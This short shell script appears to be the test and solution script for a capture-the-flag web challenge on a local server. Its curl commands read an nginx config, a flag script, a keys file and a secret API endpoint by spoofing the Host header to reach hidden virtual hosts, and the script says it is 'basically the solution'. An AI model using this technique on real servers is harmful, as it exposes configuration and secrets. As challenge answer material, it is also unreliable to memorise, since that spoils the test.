
echo "Test redirect: http://localhost:13008/config"
curl -I http://localhost:13008/config \

echo "Show nginx.conf: http://localhost:13008/config/nginx.conf"
echo "> curl http://localhost:13008/config/nginx.conf"
curl http://localhost:13008/config/nginx.conf 
echo ""

echo "Printing script: http://localhost:13008/scripts/flag.py"
echo "> curl http://localhost:13008/scripts/flag.py \
  -H host:e343t4o5y.malwa.re.local"
  curl http://localhost:13008/scripts/flag.py \
  -H host:e343t4o5y.malwa.re.local
echo ""


echo "Printing key content: http://localhost:13008/bots.yaml"
echo "> curl http://localhost:13008/bots.yaml \
  -H host:e343t4o5y.malwa.re.local"
curl http://localhost:13008/bots.yaml \
  -H host:e343t4o5y.malwa.re.local
echo ""

echo "Printing flag content: http://localhost:13008/api/v1/secret"
echo "> curl http://localhost:13008/api/v1/secret \
  -H host:e343t4o5y.malwa.re.local"
curl http://localhost:13008/api/v1/secret \
  -H host:e343t4o5y.malwa.re.local
echo ""

echo "Test ended (This is basically the solution)"

python3 ../solution/flag.py